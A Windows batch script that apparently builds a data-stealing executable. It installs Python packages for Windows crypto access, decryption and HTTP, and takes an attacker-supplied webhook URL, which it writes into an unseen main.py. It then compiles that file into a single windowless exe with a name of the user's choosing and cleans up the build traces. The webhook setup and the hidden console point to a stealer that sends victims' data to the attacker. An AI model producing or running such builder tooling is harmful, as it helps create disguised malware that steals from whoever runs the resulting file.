@echo off
chcp 65001 > nul 2>&1
echo [+] Installing required Python packages... 
echo [:] PIP: install httpx psutil pypiwin32 pycryptodome pyinstaller PIL-tools
echo.
echo please wait...
echo.
timeout /nobreak >nul 3

pip install httpx psutil pypiwin32 pycryptodome pyinstaller PIL-tools

echo.
cls

echo All packages have been installed successfully.
timeout /nobreak >nul 2
cls


echo starting...
timeout /nobreak >nul 2
cls

set /p webhook="Enter the webhook URL : "
if "%webhook%"=="" (
echo.
echo No webhook URL entered. Try again with a webhook.
pause
EXIT /B 1
)

echo.
echo Webhook URL is: %webhook%
echo.

set /p filename="Write down the name of the file you want : "
if "%filename%"=="" (
echo.
echo Please enter a filename.
pause
EXIT /B 1
)

echo.
echo Filename is: %filename%
echo.

echo Setting the webhook URL in main.py...
echo.

powershell -Command "(Get-Content -Encoding UTF8 'main.py') -replace 'webhookhere', '%webhook%' | Set-Content -Encoding UTF8 'main.py'"

echo.

echo Generating the executable file...
pyinstaller --clean --onefile --noconsole -i NONE -n %filename% main.py
rmdir /s /q pycache
rmdir /s /q build
del /f /s /q %filename%.spec

echo.
echo Generated exe as %filename%.exe in the dist folder.
echo.
timeout /nobreak >nul 2
cls

echo Restoring the original content of main.py...
timeout /nobreak >nul 2
echo.

powershell -Command "(Get-Content -Encoding UTF8 'main.py') -replace '%webhook%', 'webhookhere' | Set-Content -Encoding UTF8 'main.py'"

echo.
echo File restored to its original state.
timeout /nobreak >nul 2
cls

echo [+] Done! Check out the 'dist' folder!
echo.
echo [:] You can close this window now.
pause
EXIT /B 1
